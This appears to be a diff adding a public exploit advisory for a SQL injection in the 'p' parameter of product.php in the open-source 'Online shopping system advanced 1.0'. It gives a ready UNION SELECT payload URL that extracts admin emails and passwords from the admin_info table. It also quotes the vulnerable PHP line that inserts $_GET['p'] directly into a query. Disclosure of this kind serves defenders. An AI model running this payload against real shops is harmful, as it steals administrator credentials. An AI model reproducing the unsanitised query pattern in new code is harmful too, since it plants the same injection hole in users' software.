@@ -1,0 +1,25 @@
+# Exploit Title: Online shopping system advanced 1.0 - 'p' SQL Injection
+# Exploit Author : Majid kalantari
+# Date: 2020-04-26
+# Vendor Homepage : https://github.com/PuneethReddyHC/online-shopping-system-advanced
+# Software link: https://github.com/PuneethReddyHC/online-shopping-system-advanced/archive/master.zip
+# Version: -
+# Tested on: Windows 10
+# CVE: N/A
+===============================================
+
+# vulnerable file: product.php
+
+# vulnerable parameter : p
+
+# payload :
+http://127.0.0.1:8081/phps/product.php?p=-10+union+select+1,2,3,concat(admin_email,%27----%27,admin_password),5,6,7,8+from+admin_info%23#
+!
+
+#Description: ($product_id input is not safe)
+
+Line 46:
+$product_id = $_GET['p'];
+$sql = " SELECT * FROM products ";
+$sql = " SELECT * FROM products WHERE product_id = $product_id";
+===============================================
